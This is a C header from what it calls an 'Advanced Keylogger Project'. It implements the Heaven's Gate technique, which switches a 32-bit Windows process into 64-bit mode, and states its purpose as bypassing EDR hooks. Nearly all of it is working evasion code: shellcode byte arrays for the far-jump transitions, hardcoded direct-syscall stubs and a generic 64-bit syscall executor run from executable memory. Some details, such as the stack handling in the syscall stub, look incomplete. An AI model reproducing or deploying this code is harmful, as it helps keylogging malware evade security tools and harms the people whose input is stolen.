/*
 * Heaven's Gate Implementation
 * Execute 64-bit code from 32-bit process (WoW64 transition)
 * 
 * This technique bypasses 32-bit EDR hooks by transitioning to 64-bit mode
 * 
 * NOTE: This header is only effective for x86 builds
 * 
 * Advanced Keylogger Project
 */

#ifndef HEAVENSGATE_H
#define HEAVENSGATE_H

#include <windows.h>

// Only compile for x86
#ifndef _WIN64

// ==================== WOW64 TRANSITION ====================
/*
 * In WoW64 (Windows-on-Windows 64):
 * - Process runs in 32-bit mode (CS = 0x23)
 * - Can transition to 64-bit mode (CS = 0x33)
 * - EDR hooks are typically only in 32-bit ntdll
 * 
 * Technique:
 * 1. Far jump to 0x33:addr to switch to 64-bit mode
 * 2. Execute 64-bit code
 * 3. Far jump back to 0x23:addr
 */

// 64-bit context structure
#pragma pack(push, 1)
typedef struct _CONTEXT64 {
    DWORD64 P1Home;
    DWORD64 P2Home;
    DWORD64 P3Home;
    DWORD64 P4Home;
    DWORD64 P5Home;
    DWORD64 P6Home;
    DWORD ContextFlags;
    DWORD MxCsr;
    WORD SegCs;
    WORD SegDs;
    WORD SegEs;
    WORD SegFs;
    WORD SegGs;
    WORD SegSs;
    DWORD EFlags;
    DWORD64 Dr0;
    DWORD64 Dr1;
    DWORD64 Dr2;
    DWORD64 Dr3;
    DWORD64 Dr6;
    DWORD64 Dr7;
    DWORD64 Rax;
    DWORD64 Rcx;
    DWORD64 Rdx;
    DWORD64 Rbx;
    DWORD64 Rsp;
    DWORD64 Rbp;
    DWORD64 Rsi;
    DWORD64 Rdi;
    DWORD64 R8;
    DWORD64 R9;
    DWORD64 R10;
    DWORD64 R11;
    DWORD64 R12;
    DWORD64 R13;
    DWORD64 R14;
    DWORD64 R15;
    DWORD64 Rip;
    // XMM registers and other stuff omitted for simplicity
} CONTEXT64, *PCONTEXT64;
#pragma pack(pop)

// ==================== HEAVEN'S GATE SHELLCODE ====================

/*
 * This shellcode transitions to 64-bit mode, executes code, and returns
 * 
 * Structure:
 * [32-bit setup]
 * far jmp 0x33:x64_code  ; Enter 64-bit mode
 * [64-bit code here]
 * far jmp 0x23:x86_return ; Return to 32-bit mode
 */

// Gate transition opcodes
static const BYTE GATE_PREFIX[] = {
    // Save registers
    0x55,                       // push ebp
    0x89, 0xE5,                 // mov ebp, esp
    0x60,                       // pushad
    
    // Get 64-bit code address on stack
    0x68, 0x33, 0x00, 0x00, 0x00,  // push 0x33 (64-bit segment)
    0xE8, 0x00, 0x00, 0x00, 0x00,  // call next_instruction
    0x83, 0x04, 0x24, 0x09,        // add dword [esp], 9 (skip to 64-bit code)
    0xCB,                          // retf (far return - enters 64-bit mode)
};

static const BYTE GATE_SUFFIX[] = {
    // 64-bit code placeholder will be inserted here
    
    // Return to 32-bit mode
    // call $+5
    0xE8, 0x00, 0x00, 0x00, 0x00,
    // mov dword [rsp+4], 0x23
    0xC7, 0x44, 0x24, 0x04, 0x23, 0x00, 0x00, 0x00,
    // add dword [rsp], 0xD
    0x83, 0x04, 0x24, 0x0D,
    // retfq (far return in 64-bit mode)
    0x48, 0xCB,
    
    // Now back in 32-bit mode
    0x61,                       // popad
    0x5D,                       // pop ebp
    0xC3,                       // ret
};

// ==================== 64-BIT SYSCALL STUB ====================

// NtAllocateVirtualMemory syscall in 64-bit
static const BYTE SYSCALL64_ALLOCATE[] = {
    // mov r10, rcx
    0x4C, 0x8B, 0xD1,
    // mov eax, syscall_number (will be patched)
    0xB8, 0x18, 0x00, 0x00, 0x00,  // Default SSN for NtAllocateVirtualMemory
    // syscall
    0x0F, 0x05,
    // ret
    0xC3,
};

// ==================== HEAVEN'S GATE EXECUTOR ====================

// Memory for gate shellcode
static BYTE* g_gateShellcode = NULL;
static SIZE_T g_gateSize = 0;

// Build Heaven's Gate shellcode with custom 64-bit code
inline BYTE* BuildHeavensGate(const BYTE* x64Code, SIZE_T x64Size, SIZE_T* totalSize) {
    // Calculate total size
    *totalSize = sizeof(GATE_PREFIX) + x64Size + sizeof(GATE_SUFFIX);
    
    // Allocate executable memory
    BYTE* shellcode = (BYTE*)VirtualAlloc(NULL, *totalSize, 
                                           MEM_COMMIT | MEM_RESERVE,
                                           PAGE_EXECUTE_READWRITE);
    if (!shellcode) return NULL;
    
    // Copy prefix
    memcpy(shellcode, GATE_PREFIX, sizeof(GATE_PREFIX));
    
    // Copy 64-bit code
    memcpy(shellcode + sizeof(GATE_PREFIX), x64Code, x64Size);
    
    // Copy suffix
    memcpy(shellcode + sizeof(GATE_PREFIX) + x64Size, GATE_SUFFIX, sizeof(GATE_SUFFIX));
    
    return shellcode;
}

// Execute code through Heaven's Gate
inline bool HeavensGate_Execute(const BYTE* x64Code, SIZE_T x64Size) {
    SIZE_T totalSize;
    BYTE* gate = BuildHeavensGate(x64Code, x64Size, &totalSize);
    if (!gate) return false;
    
    // Execute the gate
    typedef void (*GateFunc)();
    GateFunc func = (GateFunc)gate;
    
    __try {
        func();
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        VirtualFree(gate, 0, MEM_RELEASE);
        return false;
    }
    
    VirtualFree(gate, 0, MEM_RELEASE);
    return true;
}

// ==================== PREDEFINED 64-BIT OPERATIONS ====================

// 64-bit syscall: NtAllocateVirtualMemory
// Parameters need to be set up in registers before call
static const BYTE X64_ALLOC_SHELLCODE[] = {
    // Setup for NtAllocateVirtualMemory
    // This is a simplified version that allocates in current process
    
    // mov r10, rcx (process handle - will be -1 for current)
    0x4C, 0x8B, 0xD1,
    // mov eax, 0x18 (syscall number - varies by Windows version)
    0xB8, 0x18, 0x00, 0x00, 0x00,
    // syscall
    0x0F, 0x05,
};

// 64-bit NOP sled for testing
static const BYTE X64_NOP_TEST[] = {
    0x90, 0x90, 0x90, 0x90,  // 4 NOPs
};

// Execute 64-bit NOP sled (for testing Heaven's Gate)
inline bool HeavensGate_Test() {
    return HeavensGate_Execute(X64_NOP_TEST, sizeof(X64_NOP_TEST));
}

// ==================== ADVANCED: DIRECT 64-BIT SYSCALL ====================

// Structure to pass parameters to 64-bit syscall
#pragma pack(push, 1)
typedef struct _SYSCALL64_PARAMS {
    DWORD64 syscallNumber;
    DWORD64 param1;
    DWORD64 param2;
    DWORD64 param3;
    DWORD64 param4;
    DWORD64 param5;
    DWORD64 param6;
    DWORD64 result;
} SYSCALL64_PARAMS, *PSYSCALL64_PARAMS;
#pragma pack(pop)

// Generic 64-bit syscall executor shellcode
// Reads parameters from structure pointed to by 32-bit EDI
static const BYTE X64_GENERIC_SYSCALL[] = {
    // In 64-bit mode, EDI becomes RDI (zero-extended)
    // Parameters structure is at [rdi]
    
    // Save non-volatile registers
    0x41, 0x57,                     // push r15
    0x41, 0x56,                     // push r14
    0x41, 0x55,                     // push r13
    0x41, 0x54,                     // push r12
    
    // Load syscall number
    0x8B, 0x07,                     // mov eax, [rdi]  (syscall number)
    
    // Load parameters (Windows x64 calling convention)
    // rcx = param1, rdx = param2, r8 = param3, r9 = param4
    // stack for param5, param6
    
    0x48, 0x8B, 0x4F, 0x08,         // mov rcx, [rdi+8]   (param1)
    0x48, 0x8B, 0x57, 0x10,         // mov rdx, [rdi+16]  (param2)
    0x4C, 0x8B, 0x47, 0x18,         // mov r8,  [rdi+24]  (param3)
    0x4C, 0x8B, 0x4F, 0x20,         // mov r9,  [rdi+32]  (param4)
    
    // For syscall, r10 = rcx
    0x4C, 0x8B, 0xD1,               // mov r10, rcx
    
    // syscall
    0x0F, 0x05,
    
    // Store result
    0x48, 0x89, 0x47, 0x38,         // mov [rdi+56], rax  (result)
    
    // Restore registers
    0x41, 0x5C,                     // pop r12
    0x41, 0x5D,                     // pop r13
    0x41, 0x5E,                     // pop r14
    0x41, 0x5F,                     // pop r15
};

// Execute a syscall through Heaven's Gate
inline DWORD64 HeavensGate_Syscall(DWORD syscallNumber, 
                                    DWORD64 param1 = 0, DWORD64 param2 = 0,
                                    DWORD64 param3 = 0, DWORD64 param4 = 0,
                                    DWORD64 param5 = 0, DWORD64 param6 = 0) {
    // Prepare parameters structure
    SYSCALL64_PARAMS params;
    params.syscallNumber = syscallNumber;
    params.param1 = param1;
    params.param2 = param2;
    params.param3 = param3;
    params.param4 = param4;
    params.param5 = param5;
    params.param6 = param6;
    params.result = 0;
    
    // Build shellcode that references our params
    // We need to set EDI to point to params before entering gate
    
    SIZE_T totalSize;
    BYTE* gate = BuildHeavensGate(X64_GENERIC_SYSCALL, sizeof(X64_GENERIC_SYSCALL), &totalSize);
    if (!gate) return (DWORD64)-1;
    
    // Create wrapper that sets EDI
    SIZE_T wrapperSize = 10 + totalSize;
    BYTE* wrapper = (BYTE*)VirtualAlloc(NULL, wrapperSize,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_EXECUTE_READWRITE);
    if (!wrapper) {
        VirtualFree(gate, 0, MEM_RELEASE);
        return (DWORD64)-1;
    }
    
    // Build wrapper:
    // mov edi, &params
    // call gate
    // ret
    BYTE* p = wrapper;
    *p++ = 0xBF; // mov edi, imm32
    *(DWORD*)p = (DWORD)&params;
    p += 4;
    *p++ = 0xE8; // call rel32
    *(DWORD*)p = (DWORD)(gate - (p + 4));
    p += 4;
    *p++ = 0xC3; // ret
    
    // Execute
    typedef void (*WrapperFunc)();
    WrapperFunc func = (WrapperFunc)wrapper;
    
    __try {
        func();
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        VirtualFree(gate, 0, MEM_RELEASE);
        VirtualFree(wrapper, 0, MEM_RELEASE);
        return (DWORD64)-1;
    }
    
    DWORD64 result = params.result;
    
    VirtualFree(gate, 0, MEM_RELEASE);
    VirtualFree(wrapper, 0, MEM_RELEASE);
    
    return result;
}

// ==================== UTILITY FUNCTIONS ====================

// Check if running under WoW64 (32-bit on 64-bit Windows)
inline bool IsWoW64Process_Check() {
    typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
    
    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)
        GetProcAddress(GetModuleHandleA("kernel32"), "IsWow64Process");
    
    if (fnIsWow64Process) {
        BOOL isWow64 = FALSE;
        if (fnIsWow64Process(GetCurrentProcess(), &isWow64)) {
            return isWow64 != FALSE;
        }
    }
    
    return false;
}

// Initialize Heaven's Gate (check if available)
inline bool InitializeHeavensGate() {
    if (!IsWoW64Process_Check()) {
        // Not running under WoW64, Heaven's Gate not applicable
        return false;
    }
    
    // Test the gate
    return HeavensGate_Test();
}

#else // _WIN64

// Stub functions for x64 builds (Heaven's Gate not needed)
inline bool InitializeHeavensGate() { return false; }
inline bool HeavensGate_Test() { return false; }
inline bool HeavensGate_Execute(const BYTE* x64Code, SIZE_T x64Size) { return false; }
inline DWORD64 HeavensGate_Syscall(DWORD syscallNumber, 
                                    DWORD64 param1 = 0, DWORD64 param2 = 0,
                                    DWORD64 param3 = 0, DWORD64 param4 = 0,
                                    DWORD64 param5 = 0, DWORD64 param6 = 0) {
    return (DWORD64)-1;
}

#endif // _WIN64

#endif // HEAVENSGATE_H
